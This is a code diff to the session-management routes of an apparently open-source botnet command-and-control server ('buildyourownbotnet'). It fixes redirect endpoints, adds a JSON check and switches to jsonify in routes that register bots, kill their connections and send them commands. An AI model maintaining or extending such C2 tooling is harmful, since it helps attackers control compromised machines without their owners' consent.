@@ -5,14 +5,14 @@ from buildyourownbotnet import c2
 from buildyourownbotnet.core.dao import session_dao, task_dao
 from buildyourownbotnet.models import db, Session
 
-
 # Blueprint
 session = Blueprint('session', __name__)
-
 
 @session.route("/api/session/new", methods=["POST"])
 def session_new():
 	"""Add session metadata to database."""
+	if not request.json:
+		return redirect(url_for('main.sessions'))
 	data = dict(request.json)
 	session_metadata = session_dao.handle_session(data)
 	return jsonify(session_metadata)
@@ -25,7 +25,7 @@ def session_remove():
 
 	if not session_uid:
 		flash('Invalid session UID', 'danger')
-		return redirect(url_for('sessions'))
+		return redirect(url_for('main.sessions'))
 
 	# kill connection to C2
 	owner_sessions = c2.sessions.get(current_user.username, {})
@@ -51,7 +51,7 @@ def session_cmd():
 	# validate session id is valid integer
 	if not session_uid:
 		flash("Invalid bot UID: " + str(session_uid))
-		return redirect(url_for('sessions'))
+		return redirect(url_for('main.sessions'))
 
 	command = request.form.get('cmd')
 
@@ -85,4 +85,4 @@ def session_poll():
 		new_sessions.append(s.serialize())
 		s.new = False
 		db.session.commit()
-	return json.dumps(new_sessions)
+	return jsonify(new_sessions)
